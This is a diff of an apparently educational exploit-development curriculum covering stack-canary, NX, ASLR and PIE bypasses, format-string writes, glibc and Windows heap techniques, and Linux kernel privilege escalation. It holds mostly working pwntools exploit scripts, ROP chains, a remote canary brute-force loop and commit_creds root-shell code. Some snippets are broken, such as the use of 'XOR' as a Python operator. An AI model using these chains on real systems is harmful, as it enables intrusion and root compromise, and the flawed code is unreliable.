+# On return: compiler checks canary against master copy → if changed: abort()
+
+# HOW TO BYPASS:
+
+# Method 1: Format string leak (most common in CTFs)
+# If the binary has a format string bug, %p or %x leaks stack values
+# The canary is on the stack → find its offset → leak it
+
+# Leak the canary at position N on the stack:
+from pwn import *
+
+p = process('./vuln_with_canary')
+
+# Send format string to find canary position:
+# Try: '%1$p.%2$p.%3$p...' and look for 0x??????00 pattern
+# Canaries always end in a null byte (the lowest byte is 0x00)
+# so it looks like: 0xd3adb33f4571e700  ← note the trailing 00
+
+payload = b'%11$p'      # adjust position 11 until you see the pattern
+p.sendlineafter(b'Input: ', payload)
+canary_raw = int(p.recvline().strip(), 16)
+log.success(f"Canary: {hex(canary_raw)}")
+
+# Now build overflow preserving the canary:
+offset_to_canary = 64   # bytes from buffer start to canary (find with GDB)
+payload = b'A' * offset_to_canary
+payload += p64(canary_raw)   # preserve canary
+payload += p64(0)            # overwrite saved RBP (don't care)
+payload += p64(win_addr)     # overwrite return address
+
+p.sendlineafter(b'Input: ', payload)
+p.interactive()
+
+# Method 2: Brute force (only works on fork() servers)
+# Each child inherits parent's canary → try one byte at a time
+# Takes 256 attempts per byte × 8 bytes = max 2048 connections
+# Works because fork() child doesn't abort the parent
+
+for byte_val in range(256):
+    p = remote('target', 1337)
+    p.send(b'A' * 64 + bytes([byte_val]))
+    response = p.recv()
+    if b'Segmentation fault' not in response:
+        # This byte is correct
+        canary_partial = bytes([byte_val])
+        break
+    p.close()
+```
+
+### NX / DEP Bypass via Return-to-libc
+
+```python
+# NX (No-Execute) / DEP: stack and heap pages are not executable
+# Your shellcode sits in memory but CPU refuses to execute it (SIGSEGV)
+# BYPASS: don't inject code; reuse existing code (ROP / ret2libc)
+
+# ret2libc classic:
+# Instead of jumping to shellcode:
+#   1. Jump to system() in libc
+#   2. With argument "/bin/sh" (already in libc's data section)
+
+# Building a ret2libc payload:
+from pwn import *
+
+# Requires: no ASLR (fixed addresses) OR we've already leaked libc base
+elf  = ELF('./vuln')
+libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+p    = process('./vuln')
+
+# If no ASLR:
+libc_base    = libc.address  # or find with: ldd ./vuln → libc address
+system_addr  = libc_base + libc.symbols['system']
+binsh_addr   = libc_base + next(libc.search(b'/bin/sh'))
+
+# x86-64 calling convention: first argument goes in RDI
+# We need: RDI = &"/bin/sh", then call system()
+# Need gadget: pop rdi; ret
+rop = ROP(elf)
+pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
+ret     = rop.find_gadget(['ret'])[0]   # stack alignment
+
+payload  = b'A' * 72                 # offset to return address
+payload += p64(pop_rdi)              # gadget: pop rdi; ret
+payload += p64(binsh_addr)           # rdi = "/bin/sh" address
+payload += p64(ret)                  # alignment: stack must be 16-byte aligned
+payload += p64(system_addr)          # call system("/bin/sh")
+
+p.sendlineafter(b'> ', payload)
+p.interactive()
+```
+
+### ASLR + PIE Bypass via Information Leak
+
+```python
+# ASLR: randomizes libc, stack, heap base addresses each run
+# PIE: randomizes the binary's own base address
+#
+# BYPASS: find a memory disclosure bug → leak one address → calculate base
+
+from pwn import *
+
+elf  = ELF('./vuln')
+libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+p    = process('./vuln')
+
+# ── Stage 1: Leak a libc address via GOT ─────────────────────────────────────
+# GOT (Global Offset Table) contains real addresses of libc functions
+# If we can call puts(GOT[puts]) we leak the real puts() address in libc
+# From real puts address → subtract puts symbol offset → libc base
+
+rop = ROP(elf)
+
+pop_rdi  = rop.find_gadget(['pop rdi', 'ret'])[0]
+ret_gadg = rop.find_gadget(['ret'])[0]
+puts_plt = elf.plt['puts']        # PLT stub that calls puts
+puts_got = elf.got['puts']        # GOT entry for puts (contains real address)
+main_addr = elf.symbols['main']   # Return here after leak to do second stage
+
+# Stage 1 payload: call puts(GOT[puts]) then return to main
+offset = 72
+payload1  = b'A' * offset
+payload1 += p64(pop_rdi)      # set rdi = address of GOT[puts]
+payload1 += p64(puts_got)
+payload1 += p64(ret_gadg)     # alignment
+payload1 += p64(puts_plt)     # call puts(GOT[puts]) → prints real puts address
+payload1 += p64(main_addr)    # return to main for stage 2
+
+p.sendlineafter(b'> ', payload1)
+
+# ── Stage 2: Parse the leaked address ────────────────────────────────────────
+leaked_puts = u64(p.recvline().strip().ljust(8, b'\x00'))
+log.success(f"Leaked puts @ {hex(leaked_puts)}")
+
+libc.address = leaked_puts - libc.symbols['puts']   # calculate base
+log.success(f"libc base    @ {hex(libc.address)}")
+
+system_addr  = libc.symbols['system']
+binsh_addr   = next(libc.search(b'/bin/sh'))
+
+# ── Stage 3: Get shell (now with real addresses) ──────────────────────────────
+payload2  = b'A' * offset
+payload2 += p64(pop_rdi)
+payload2 += p64(binsh_addr)
+payload2 += p64(ret_gadg)
+payload2 += p64(system_addr)
+
+p.sendlineafter(b'> ', payload2)
+p.interactive()
+```
+
+### Building ROP Chains
+
+```bash
+# Find gadgets in a binary:
+ropper -f ./binary --search "pop rdi; ret"
+ropper -f ./binary --search "pop rsi; pop r15; ret"    # common: pop rsi; ret rare in binaries
+ROPgadget --binary ./binary --rop                      # show all usable chains
+
+# MOST NEEDED gadgets:
+# pop rdi; ret       → set RDI (1st argument)
+# pop rsi; ret       → set RSI (2nd argument)    ← rare, often: pop rsi; pop r15; ret
+# pop rdx; ret       → set RDX (3rd argument)    ← VERY rare in libc, use __libc_csu_init trick
+# ret                → stack alignment gadget (1 ret = +8 bytes to stack)
+# syscall            → for direct syscall ROP chains
+
+# Common ROP pattern for execve("/bin/sh", NULL, NULL) via direct syscall:
+# pop rax; ret   → rax = 59 (execve)
+# pop rdi; ret   → rdi = &"/bin/sh"
+# pop rsi; ret   → rsi = 0
+# pop rdx; ret   → rdx = 0
+# syscall        → execute execve
+
+# pwntools automated ROP:
+from pwn import *
+elf  = ELF('./binary')
+libc = ELF('./libc.so.6')
+rop  = ROP([elf, libc])
+rop.call(libc.symbols['system'], [next(libc.search(b'/bin/sh'))])
+print(rop.dump())      # shows the chain symbolically
+payload = flat({72: rop.chain()})   # offset 72, then the ROP chain
+```
+
+---
+
+## 4. FORMAT STRING VULNERABILITIES
+
+### Time: 1–2 weeks | MITRE: T1203
+
 ```c
-// Chunks: every malloc'd region is a chunk
-// Chunk structure:
-struct chunk {
-    size_t prev_size;    // Size of previous chunk if free
-    size_t size;         // Size of this chunk (+ 3 flag bits)
-    // For free chunks:
-    struct chunk* fd;    // Forward pointer (free list)
-    struct chunk* bk;    // Backward pointer (free list)
+// THE BUG:
+printf(user_input);           // VULNERABLE: user controls the format string
+printf("%s", user_input);     // SAFE: format string is fixed, user_input is data
+
+// WHY IT'S DANGEROUS:
+// printf reads additional arguments from the stack based on format specifiers
+// %p / %x: READ a value from the stack (information leak)
+// %n:      WRITE (bytes printed so far) to an address on the stack (arbitrary write)
+```
+
+### Step 1: Information Leak via %p
+
+```python
+from pwn import *
+p = process('./vuln_fmtstr')
+
+# Send incrementing format strings to map the stack:
+for i in range(1, 30):
+    p.sendlineafter(b'Input: ', f'%{i}$p'.encode())
+    val = p.recvline().strip()
+    print(f"Arg {i:2d}: {val.decode()}")
+
+# Look for:
+# - Values like 0x7fff...  → stack addresses (useful if PIE is enabled)
+# - Values like 0x7f...    → libc addresses  (use to defeat ASLR)
+# - Values like 0x???00    → canary (always ends in 00)
+# - Values like 0x401...   → binary code addresses (use to defeat PIE)
+```
+
+### Step 2: Arbitrary Write via %n (IMPORTANT: RELRO awareness)
+
+```python
+# %n writes the NUMBER OF CHARACTERS PRINTED SO FAR to the pointer argument
+# This lets you write arbitrary values to arbitrary addresses
+# However: RELRO (Relocation Read-Only) affects what you can overwrite
+
+# RELRO Status and what you can/cannot overwrite:
+# No RELRO:   GOT entries writable → overwrite GOT[exit] → redirect exit() call
+# Partial RELRO: GOT is writable AFTER .init_array is populated
+#               → you can still overwrite GOT entries of lazily-loaded functions
+# Full RELRO:  GOT is READ-ONLY → cannot overwrite GOT
+#               → must find writable targets: function pointers, __malloc_hook,
+#                 __free_hook, __exit_funcs, atexit() list, stack return addresses
+
+# Check RELRO:
+checksec --file=./vuln
+# "Full RELRO" → cannot use GOT → target __free_hook or return addresses
+
+# pwntools handles the format string payload construction:
+from pwn import *
+p = process('./vuln_fmtstr')
+
+# Arbitrary write example (assumes partial RELRO: GOT writable):
+elf = ELF('./vuln_fmtstr')
+target_addr = elf.got['exit']    # overwrite GOT entry for exit()
+new_value   = elf.symbols['win'] # redirect to win()
+
+# fmtstr_payload(offset, {addr: value}): offset is the argument position
+# where your buffer appears on the stack (found in Step 1)
+offset  = 8   # position where your input appears (found from mapping)
+payload = fmtstr_payload(offset, {target_addr: new_value})
+p.sendlineafter(b'Input: ', payload)
+# Now when exit() is called → win() executes
+
+# Full RELRO target: __free_hook (glibc < 2.34) or __malloc_hook
+# glibc 2.34 REMOVED __malloc_hook and __free_hook
+# On glibc 2.35+: target __exit_funcs or use a different primitive entirely
+# This is why knowing your target's glibc version is mandatory
+```
+
+---
+
+## 5. HEAP EXPLOITATION - LINUX glibc (MODERN, 2027-ACCURATE)
+
+### Time: 4–5 weeks | Difficulty: Extreme
+
+### Resources
+
+| Resource | Type | Duration | Cost | Notes |
+|---|---|---|---|---|
+| [pwn.college Heap Exploitation](https://pwn.college/system-security/heap-exploitation/) | Platform | 15 hrs | FREE | **Best structured heap course. Do every module.** |
+| [how2heap](https://github.com/shellphish/how2heap) | Repository | 10 hrs | FREE | Working examples of every heap technique. Your primary reference. |
+| [glibc malloc internals](https://sourceware.org/glibc/wiki/MallocInternals) | Docs | 5 hrs | FREE | Read before how2heap. Understand what you're corrupting. |
+| [HeapLAB](https://www.crowdstrike.com/blog/heap-exploitation-course-series/) | Articles | 8 hrs | FREE | Excellent technique deep-dives. |
+
+### glibc Allocator Internals
+
+```c
+// Every malloc'd region is stored as a "chunk"
+// Chunk structure in memory (simplified):
+
+// In-use chunk:
+// ┌──────────────────────┐
+// │ prev_size (8 bytes)  │  size of prev chunk (only valid if prev is free)
+// │ size + flags (8 B)   │  size of this chunk | A (NON_MAIN_ARENA) | M (MMAPPED) | P (PREV_INUSE)
+// │ user data...         │  ← malloc() returns pointer to here
+// └──────────────────────┘
+
+// Free chunk (in a bin):
+// ┌──────────────────────┐
+// │ prev_size (8 bytes)  │
+// │ size + flags (8 B)   │
+// │ fd (8 bytes)         │  forward pointer (next free chunk in list)
+// │ bk (8 bytes)         │  backward pointer (prev free chunk in list)
+// │ ...                  │
+// └──────────────────────┘
+
+// BINS (free lists organized by size):
+// tcache:    per-thread cache, singly-linked, 7 chunks max per size class
+//            sizes: 24 to 1032 bytes (16-byte increments), 64 bins
+//            MINIMAL CHECKS → primary target for exploitation
+// fastbins:  singly-linked, chunks ≤ 160 bytes
+// unsorted:  landing zone before chunks are sorted into small/large
+// small bins: doubly-linked, chunks < 512 bytes
+// large bins: doubly-linked with skip list, chunks ≥ 512 bytes
+```
+
+### Technique 1: Tcache Poisoning
+
+```c
+// Goal: make malloc() return an arbitrary address
+// By corrupting the tcache free list's fd pointer
+
+// Vulnerable code pattern:
+char *a = malloc(0x20);   // allocate chunk A
+char *b = malloc(0x20);   // allocate chunk B
+free(a);                  // a → tcache bin [0x20]
+free(b);                  // b → tcache bin [0x20] (now: b → a → NULL)
+
+// After free(a) and free(b):
+// tcache[0x20]: b → a → NULL
+
+// If we can write to b's fd pointer (e.g., heap overflow or UAF):
+*(char**)b = target_addr;   // overwrite b's fd pointer with our target
+// tcache[0x20]: b → target_addr → ???
+
+char *p1 = malloc(0x20);    // returns b (pops head)
+char *p2 = malloc(0x20);    // returns target_addr!
+// Now we write to *p2 → we write to target_addr
+strcpy(p2, shellcode_or_pointer);  // arbitrary write
+```
+
+```python
+# pwntools exploit skeleton for tcache poisoning:
+from pwn import *
+
+p = process('./heap_vuln')
+elf = ELF('./heap_vuln')
+
+# Allocate two same-size chunks
+p.sendlineafter(b'> ', b'1')  # alloc A (size 0x28)
+p.sendlineafter(b'> ', b'1')  # alloc B (size 0x28)
+
+# Free them (UAF: we keep the pointers)
+p.sendlineafter(b'> ', b'2')  # free A → goes to tcache
+p.sendlineafter(b'> ', b'2')  # free B → tcache head: B → A
+
+# Use UAF: write to freed B's fd pointer
+p.sendlineafter(b'> ', b'3')  # edit freed B
+p.sendlineafter(b'Payload: ', p64(target_addr))  # overwrite fd
+
+# tcache is now: B → target_addr
+
+malloc1 = p.sendlineafter(b'> ', b'1')  # alloc: gets B
+malloc2 = p.sendlineafter(b'> ', b'1')  # alloc: gets target_addr!
+
+# Write to the returned target_addr pointer
+p.sendlineafter(b'> ', b'3')
+p.sendlineafter(b'Payload: ', p64(win_func))
+```
+
+### Technique 2: Safe-Linking Bypass (glibc 2.32+: MANDATORY FOR 2027)
+
+```c
+// CRITICAL: glibc 2.32 (Ubuntu 21.04+, released November 2020) introduced Safe-Linking
+// All modern targets (Ubuntu 22.04 = glibc 2.35, Ubuntu 24.04 = glibc 2.39) use this.
+// If you don't know Safe-Linking bypass, you cannot exploit heap on any modern system.
+
+// WHAT SAFE-LINKING DOES:
+// Before glibc 2.32, tcache fd pointer was stored in plaintext:
+//   chunk->fd = next_free_chunk;   // just a raw pointer
+//
+// After glibc 2.32, fd pointer is XOR-obfuscated:
+//   chunk->fd = (next_free_chunk) XOR (chunk_address >> 12)
+//   This is called "PROTECT_PTR"
+
+// The key for a given chunk = (address_of_fd_pointer >> 12)
+// So: stored_fd = real_fd XOR ((&stored_fd) >> 12)
+
+// WHY >> 12?
+// Page size = 0x1000 = 4096 bytes = 12 bits
+// Shifting right by 12 strips the page offset → uses page number as key
+// Each allocation gets a different key (key depends on heap address)
+
+// BYPASS STRATEGY:
+// To forge a tcache fd pointer, you need the key
+// Key = (&fd_pointer) >> 12
+// = (heap_chunk_address) >> 12
+//
+// Approach 1: Leak a heap address first → derive key → XOR target address
+// Approach 2: If chunk fd is zero (NULL-terminated list), key IS the stored value
+//             because: stored = 0 XOR key = key
+//             So reading a "null" fd gives you the key directly!
+
+// EXPLOIT PATTERN with Safe-Linking:
+
+// Step 1: Trigger UAF/read on a freed chunk to leak its fd pointer
+// If the freed chunk was the last in the tcache (fd = NULL):
+//   stored_fd = NULL XOR (chunk_addr >> 12) = chunk_addr >> 12
+//   → we get chunk_addr >> 12 directly
+//   → heap_leak = stored_fd << 12  (approximate: lowest 12 bits are 0)
+//   → key = stored_fd
+
+// Step 2: Forge a new fd pointer to target_addr:
+//   forged_fd = target_addr XOR key
+
+// Step 3: Write forged_fd to the freed chunk's fd field
+// malloc() will decrypt: forged_fd XOR key = target_addr XOR key XOR key = target_addr ✓
+```
+
+```python
+# Full Safe-Linking bypass exploit skeleton:
+from pwn import *
+
+p   = process('./modern_heap_vuln')
+elf = ELF('./modern_heap_vuln')
+
+# ── Step 1: Allocate and free a chunk to populate tcache ─────────────────────
+alloc(0x28, b'AAAA')   # chunk A at some heap address
+free(A_index)          # fd = NULL (first in tcache), stored as: 0 XOR (A_addr >> 12)
+
+# ── Step 2: Use UAF/heap read to leak the stored fd pointer ─────────────────
+leaked_fd = read_chunk(A_index)    # read the freed chunk's fd field
+key = leaked_fd                    # stored_fd = key XOR NULL = key
+
+heap_base = key << 12             # approximate heap base (lowest 12 bits = 0)
+log.success(f"Key:       {hex(key)}")
+log.success(f"Heap base: {hex(heap_base)}")
+
+# ── Step 3: Allocate another chunk and free it ───────────────────────────────
+alloc(0x28, b'BBBB')   # chunk B
+free(B_index)          # tcache: B → A
+
+# ── Step 4: Poison B's fd pointer with target address ────────────────────────
+target = elf.symbols['__free_hook']     # or any writable target
+forged_fd = target XOR key              # Safe-Linking: must XOR with key
+
+edit_chunk(B_index, p64(forged_fd))     # overwrite B's fd with poisoned pointer
+
+# ── Step 5: Two mallocs get us arbitrary allocation ──────────────────────────
+alloc(0x28, b'JUNK')   # returns B (pops head)
+alloc(0x28, p64(system_addr))  # returns target address → writes system() there
+
+# Now __free_hook = system
+# free(chunk containing "/bin/sh") → system("/bin/sh")
+alloc(0x28, b'/bin/sh\x00')
+free(last_alloc_index)
+
+p.interactive()
+
+# KEY POINT: if you skip the XOR step, malloc() sees a garbage address,
+# crashes with SIGSEGV, and you get nothing. This is why most outdated
+# tcache poisoning examples fail on modern systems.
+```
+
+### Technique 3: Use-After-Free (UAF)
+
+```c
+// Pattern: allocate → free → use the freed pointer
+// Because glibc doesn't zero free'd memory, data is still there
+// More importantly: the chunk is now in a bin, fd/bk are written by allocator
+
+typedef struct {
+    void (*function_ptr)(char *);  // function pointer in the struct
+    char name[32];
+} Object;
+
+Object *obj = malloc(sizeof(Object));
+obj->function_ptr = safe_function;
+free(obj);  // obj is freed, goes to tcache bin of sizeof(Object)
+
+// Now allocate SAME SIZE to get the same memory:
+char *attacker_buf = malloc(sizeof(Object));
+memcpy(attacker_buf, evil_shellcode_ptr, 8);  // overwrite function_ptr offset
+
+// Trigger the original object's method (use-after-free):
+obj->function_ptr(obj->name);  // calls our controlled address!
+```
+
+### Technique 4: House of Spirit
+
+```c
+// Force a controlled chunk to appear in a tcache/fastbin
+// by crafting a fake chunk header and calling free() on it
+
+// REQUIREMENTS:
+// - Stack / global write primitive (can write fake size field)
+// - A pointer you can set to an arbitrary value (to pass to free())
+
+// GOAL: make malloc() return a stack address or GOT address
+
+// Create a fake chunk on the stack:
+size_t fake_chunk[4];
+fake_chunk[0] = 0;         // prev_size (ignored for tcache)
+fake_chunk[1] = 0x21;     // size = 0x20, PREV_INUSE bit set (size must match bin)
+// The pointer passed to free() should be &fake_chunk[2]
+// (free() expects a pointer to the USER DATA region, 2 words past chunk start)
+
+free(&fake_chunk[2]);      // inserts fake chunk into tcache[0x20]
+malloc(0x18);              // returns &fake_chunk[2] → you now write to the stack!
+```
+
+### Technique 5: Large Bin Attack
+
+```c
+// Target: write a large value to an almost-arbitrary address
+// Works when you can corrupt a freed large bin chunk's bk_nextsize pointer
+// glibc will write the chunk address into *bk_nextsize during insertion
+
+// Prerequisites:
+// - Heap leak (know a large bin chunk's address)
+// - Write primitive to overwrite bk_nextsize in a large bin free chunk
+//   (often via overflow or UAF on an adjacent chunk)
+
+// What you can overwrite: any writable address gets victim_chunk_addr written to it
+// Targets: global pointers, io_list_all, mp_.tcache_bins (to extend tcache range)
+
+// Detailed write-up: how2heap/large_bin_attack.c in shellphish/how2heap
+// This is required study for Phase 4 heap chain construction
+```
+
+---
+
+## 6. WINDOWS HEAP EXPLOITATION
+
+### Time: 3–4 weeks | Difficulty: Extreme
+
+### Resources
+
+| Resource | Type | Duration | Cost | Notes |
+|---|---|---|---|---|
+| [Heaps of Pwning - YouTube](https://www.youtube.com/watch?v=bthQKxXqHqc) | YouTube | 1.5 hrs | FREE | Windows heap internals talk. Foundation. |
+| [Windows 10 Segment Heap - NCC Group](https://research.nccgroup.com/2021/06/01/putting-the-halo-bypass/) | Paper | 4 hrs | FREE | Deep dive Segment Heap. |
+| [WinDbg heap commands](https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/) | Docs | 3 hrs | FREE | `!heap`, `dt _HEAP`, `!heap -stat` |
+
+```
+Windows Heap: NT Heap vs Segment Heap
+
+NT Heap (Windows < 8, legacy, 32-bit processes):
+├── Front-end: Lookaside Lists (fast, per-size, max 256 entries)
+├── Back-end: Free Lists (ListHints + FreeList[128])
+└── Each chunk: HEAP_ENTRY (8-byte header: size, prev_size, flags)
+
+Segment Heap (Windows 10 RS5+, 64-bit, default for most native processes):
+├── Low Fragmentation Heap (LFH): allocations ≤ 16KB, size buckets
+│   - Each bucket has pages of fixed-size blocks
+│   - Allocations within a bucket are randomized (not sequential)
+│   - Harder to overflow into adjacent same-type object
+├── Variable Size (VS): allocations 16KB – 512KB
+│   - HEAP_VS_CHUNK_HEADER per chunk, similar to glibc
+├── Large Allocation: > 512KB
+│   - Direct MmMapViewSection (not in heap at all)
+└── Segment Allocator: manages 256MB segments
+
+Attack Vectors:
+1. Heap overflow into adjacent chunk → corrupt size/flags → on free: 
+   coalescing uses wrong size → HEAP_ENTRY points to attacker-controlled address
+2. UAF: free chunk → HeapAlloc same size → fill with controlled data
+   → dereference as original type → type confusion → function pointer control
+3. LFH exploit: fill LFH bucket → free one chunk → allocate different TYPE
+   in same bucket slot → type confusion (requires heap shaping first)
+
+WinDbg heap inspection:
+!heap -a               -- list all heaps in process
+!heap -stat            -- statistics per heap
+!heap -h 0x01234000    -- detailed view of specific heap
+dt _HEAP 0x01234000    -- dump HEAP structure
+dt _HEAP_ENTRY 0x...   -- dump a single chunk header
+gflags /p /enable target.exe /full  -- enable Page Heap (each alloc = own page)
+                                     -- catches overflows immediately, great for debugging
+```
+
+---
+
+## 7. LINUX KERNEL EXPLOITATION
+
+### Time: 4–6 weeks | Difficulty: Extreme
+
+### Resources
+
+| Resource | Type | Duration | Cost | Notes |
+|---|---|---|---|---|
+| [Linux Kernel Exploitation - YouTube](https://www.youtube.com/watch?v=il1wGXeKJAo) | YouTube | 3 hrs | FREE | Module interaction and exploit techniques. |
+| [lkmidas kernel exploit series](https://github.com/lkmidas/learning-kernel-exploitation) | GitHub | 15 hrs | FREE | **The best practice series. Structured, progressive.** |
+| [KSPP - Kernel Self Protection Project](https://kernsec.org/wiki/index.php/Kernel_Self_Protection_Project) | Wiki | 5 hrs | FREE | Understand every mitigation you're bypassing. |
+| [DirtyCow CVE-2016-5195](https://dirtycow.ninja/) | Site | 2 hrs | FREE | Read the write-up. Classic race condition exploit. |
+
+### Step 1: Kernel Debugging Lab with QEMU
+
+```bash
+# Build a vulnerable kernel for safe practice (do NOT practice on live systems)
+# This is the correct setup: QEMU VM + GDB debugging over serial port
+
+# ── 1. Download and configure a vulnerable kernel ────────────────────────────
+# Option A: Use a pre-built CTF kernel (fastest):
+# https://github.com/lkmidas/learning-kernel-exploitation
+# Download their kernel images and rootfs.
+
+# Option B: Build your own (most educational):
+wget https://cdn.kernel.org/pub/linux/kernel/v5.x/linux-5.15.tar.xz
+tar -xf linux-5.15.tar.xz && cd linux-5.15
+
+# Configure with debug symbols and protections disabled (for learning):
+make defconfig
+cat >> .config << 'EOF'
+CONFIG_DEBUG_INFO=y
+CONFIG_DEBUG_INFO_DWARF4=y
+CONFIG_GDB_SCRIPTS=y
+CONFIG_KGDB=y
+CONFIG_KGDB_SERIAL_CONSOLE=y
+CONFIG_RANDOMIZE_BASE=n        # KASLR off for initial learning
+CONFIG_STACKPROTECTOR=n        # Stack canaries off for initial learning
+EOF
+make -j$(nproc)
+# Outputs: arch/x86/boot/bzImage (kernel) + vmlinux (with debug symbols)
+
+# ── 2. Create minimal rootfs with busybox ────────────────────────────────────
+# (skip if using lkmidas pre-built rootfs)
+wget https://busybox.net/downloads/busybox-1.35.0.tar.bz2
+tar -xf busybox-1.35.0.tar.bz2 && cd busybox-1.35.0
+make defconfig
+make CONFIG_STATIC=y -j$(nproc)
+make install
+
+# Create rootfs directory structure and init:
+mkdir -p rootfs/{bin,sbin,etc,proc,sys,dev}
+cp -a _install/* rootfs/
+cat > rootfs/init << 'INITEOF'
+#!/bin/sh
+mount -t proc none /proc
+mount -t sysfs none /sys
+mount -t devtmpfs none /dev
+echo "Kernel: $(uname -r)"
+setsid /bin/sh -c 'exec /bin/sh </dev/ttyS0 >/dev/ttyS0 2>&1'
+INITEOF
+chmod +x rootfs/init
+(cd rootfs && find . | cpio -o --format=newc | gzip > ../rootfs.cpio.gz)
+
+# ── 3. Launch QEMU with GDB stub ─────────────────────────────────────────────
+qemu-system-x86_64 \
+    -kernel arch/x86/boot/bzImage \
+    -initrd rootfs.cpio.gz \
+    -append "console=ttyS0 nokaslr nopti nosmap nosmep" \
+    -nographic \
+    -s \          # -s = shorthand for -gdb tcp::1234
+    -S            # -S = pause CPU at start, wait for GDB to connect
+
+# ── 4. Connect GDB in another terminal ───────────────────────────────────────
+gdb vmlinux       # load kernel with debug symbols
+target remote :1234    # connect to QEMU's GDB stub
+# pwndbg prompt appears
+c                      # continue kernel boot
+# Press Ctrl+C to interrupt and inspect kernel state
+b commit_creds         # set breakpoint on commit_creds (privilege escalation)
+```
+
+### Kernel Exploit Patterns
+
+```c
+// ── Pattern 1: Kernel Module UAF → Function Pointer Control ──────────────────
+// Vulnerable kernel module:
+struct victim_obj {
+    void (*do_something)(struct victim_obj *);
+    char data[32];
 };
 
-// Bins: free lists organized by size
-// tcache: per-thread cache, fast, minimal checks
-// fastbins: chunks <= 80 bytes
-// unsorted bin: landing zone before sorted
-// small/large bins: sorted by size
+// Exploit flow:
+// 1. Allocate victim_obj via module ioctl
+// 2. Free it (UAF: module has bug that doesn't null the pointer)
+// 3. Spray kernel objects of SAME SIZE to reclaim the freed memory
+// 4. Our spray data overlaps victim_obj.do_something
+// 5. Trigger "use" of freed object → jumps to our controlled address
 
-// Vulnerabilities:
-// Use-After-Free: use pointer after free() → dangling pointer
-// Double-Free: free() same chunk twice → corruption
-// Heap overflow: write past chunk boundary → corrupt metadata
-// Off-by-one: write one byte past allocation
-```
+// ── Pattern 2: commit_creds + prepare_kernel_cred ────────────────────────────
+// THE standard Linux kernel privilege escalation payload
+// Overwrites current process's credentials with root credentials
 
----
+// Kernel addresses (get from /proc/kallsyms or symbols file):
+// cat /proc/kallsyms | grep commit_creds
+// cat /proc/kallsyms | grep prepare_kernel_cred
 
-#### **5. Kernel Exploitation (Linux)**
+typedef int (*commit_creds_t)(void *);
+typedef void *(*prepare_kernel_cred_t)(void *);
 
-**Time:** 4–6 weeks | **Difficulty:** Extreme
+void kernel_payload(void) {
+    // Get function addresses (from leak or fixed if KASLR disabled):
+    commit_creds_t commit_creds_fn = (commit_creds_t)COMMIT_CREDS_ADDR;
+    prepare_kernel_cred_t prepare_kernel_cred_fn =
+        (prepare_kernel_cred_t)PREPARE_KERNEL_CRED_ADDR;
 
-| Resource | Type | Duration | Cost | Notes |
-|----------|------|----------|------|-------|
-| [Linux Kernel Exploitation](https://www.youtube.com/watch?v=il1wGXeKJAo) | YouTube | 3 hours | FREE | Kernel module interaction, exploit techniques. |
-| [lkmidas/kernel-exploit-factory](https://github.com/lkmidas/learning-kernel-exploitation) | GitHub | 15 hours | FREE | Practice series with write-ups. |
-| [CTF Kernel Exploitation](https://www.youtube.com/watch?v=o0TFkFl6eEQ) | YouTube | 2 hours | FREE | KCTF challenge walkthrough. |
-| [Linux Kernel Security](https://kernsec.org/wiki/index.php/Kernel_Self_Protection_Project) | Wiki | 5 hours | FREE | KSPP: know what you're bypassing. |
-
-**Kernel Exploitation Patterns:**
-```c
-// Setup: Disable protections for learning
-echo 0 > /proc/sys/kernel/randomize_va_space    // KASLR off
-echo 0 > /proc/sys/kernel/kptr_restrict         // Kernel pointers visible
-echo 0 > /proc/sys/kernel/dmesg_restrict        // dmesg readable
-
-// Pattern 1: Kernel stack overflow → overwrite return address
-// Same as userland but in kernel space
-// commit_creds(prepare_kernel_cred(0)) → elevate to root
-
-// Pattern 2: Use-After-Free in kernel object
-// Spray objects to control freed memory
-// Corrupt function pointer in structure → RIP control
-// Call object method → ROP/shellcode
-
-// Pattern 3: Race condition (TOCTOU)
-// Two threads: one checks permission, one exploits window
-// DirtyCow (CVE-2016-5195), Dirty Pipe (CVE-2022-0847)
-
-// Escalation shellcode:
-void escalate() {
-    void *(*prepare_kernel_cred)(void *) =
-        (void *(*)(void *))PREPARE_KERNEL_CRED;
-    void (*commit_creds)(void *) =
-        (void (*)(void *))COMMIT_CREDS;
-    commit_creds(prepare_kernel_cred(0));
+    // prepare_kernel_cred(NULL) creates root credentials (uid=0, gid=0)
+    // commit_creds() applies them to the current task
+    commit_creds_fn(prepare_kernel_cred_fn(NULL));
 }
 
-// After shellcode runs in kernel context: getuid() == 0
-// fork() → system("/bin/bash")
+// After kernel_payload() returns and execution is back in userspace:
+system("/bin/sh");  // → getuid() == 0 → root shell
 ```
 
-**Kernel Mitigations to Know:**
+### Kernel Mitigations and Bypasses
+
 ```
-SMEP: Supervisor Mode Execution Prevention
-  → Cannot execute userland pages in kernel mode
-  → Bypass: pivot stack to kernel ROP gadgets
+SMEP (Supervisor Mode Execution Prevention):
+  WHAT: CPU refuses to execute pages marked as user-space in kernel mode
+  EFFECT: Can't jump to userspace shellcode from kernel context
+  BYPASS: Use kernel ROP gadgets only (never jump to user pages)
+          ROP chain: commit_creds → iretq trampoline → back to userspace
 
-SMAP: Supervisor Mode Access Prevention
-  → Cannot READ/WRITE userland memory in kernel mode
-  → Bypass: craft payload entirely in kernel space
+SMAP (Supervisor Mode Access Prevention):
+  WHAT: CPU refuses to read/write userspace memory while in kernel mode
+  EFFECT: Can't dereference userspace pointers in kernel shellcode
+  BYPASS: Place all data in kernel space (use kernel stack or sprayed kernel objects)
+          Or: craft ROP chain that only uses kernel data
 
-KASLR: Kernel Address Space Layout Randomization
-  → Bypass: leak from /proc/kallsyms (if readable), dmesg, side-channels
+KASLR (Kernel Address Space Layout Randomization):
+  WHAT: Kernel image loaded at random base each boot
+  EFFECT: Can't hardcode kernel function addresses
+  BYPASS: 
+    - /proc/kallsyms (if readable: cat /proc/sys/kernel/kptr_restrict)
+    - dmesg leaks (if dmesg_restrict = 0)
+    - Side-channel via timing (KAISER/KPTI side-channel variants)
+    - Leak from kernel object with embedded pointer
 
-KPTI: Kernel Page Table Isolation (Meltdown mitigation)
-  → Separate page tables for user/kernel
-  → Bypass: KPTI trampoline after shellcode
-
-Stack Canaries in kernel: same concept as userland
-CFI in kernel: increasingly deployed in newer kernels
+KPTI (Kernel Page Table Isolation):
+  WHAT: Separate page tables for user/kernel mode (Meltdown mitigation)
+  EFFECT: Kernel page table doesn't map userspace → iretq sequence changed
+  BYPASS: Use KPTI trampoline (swapgs_restore_regs_and_return_to_usermode)
